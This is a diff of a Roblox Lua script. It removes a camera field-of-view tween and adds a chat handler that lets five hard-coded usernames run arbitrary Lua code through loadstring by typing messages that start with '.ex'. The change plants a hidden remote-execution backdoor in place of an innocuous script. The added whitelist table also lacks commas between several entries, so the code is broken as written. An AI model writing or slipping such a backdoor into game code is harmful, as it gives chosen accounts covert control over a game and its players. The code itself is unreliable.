@@ -1,9 +1,62 @@
--- This script changes the camera's FieldOfView smoothly.
+local TextChatService = game:GetService("TextChatService")
 
-local camera = workspace.CurrentCamera
-local targetFov = 10 
+local whitelist = {
+    ["aabbaaii14"] = true,
+    ["Straightoutacomptn"] = true,
+    ["Canbinfexs430765hggf"] = true
+    ["bladeball_player234"] = true
+    ["aabbaaii13"] = true
+}
 
-while true do
-  camera.FieldOfView = camera.FieldOfView - (camera.FieldOfView - targetFov) * 0.1
-  wait(0.1)
+TextChatService.OnIncomingMessage = function(message: TextChatMessage)
+    local properties = Instance.new("TextChatMessageProperties")
+    properties.Text = message.Text
+    properties.PrefixText = message.PrefixText
+
+    local sender = message.TextSource and message.TextSource.Name
+    if not whitelist[sender] then
+        if message.Text:sub(1, 3) == ".ex" then
+            properties.Text = "[System]: You are not authorized to use this command."
+            print("[Unauthorized Attempt]:", sender, "tried to use .ex command.")
+            return properties
+        end
+
+        return properties
+    end
+
+    if message.Text:sub(1, 3) == ".ex" then
+        local codeToExecute = message.Text:sub(5)
+        
+        print("[Code Execution]: Running the provided code...")
+
+        local success, result = pcall(function()
+            local func = loadstring(codeToExecute)
+            if func then
+                local oldPrint = print
+                local function printOverride(...)
+                    oldPrint("[User Output]:", ...)
+                end
+
+                _G.print = printOverride
+                local funcResult = func()
+                _G.print = oldPrint
+                return funcResult
+            end
+        end)
+
+        if success then
+            if result ~= nil then
+                print("[Execution Result]:", result)
+            else
+                print("[Execution Result]: Code executed successfully.")
+            end
+        else
+            warn("[Execution Error]:", result)
+        end
+        
+        properties.Text = "[System]: Command executed successfully."
+        return properties
+    end
+
+    return properties
 end
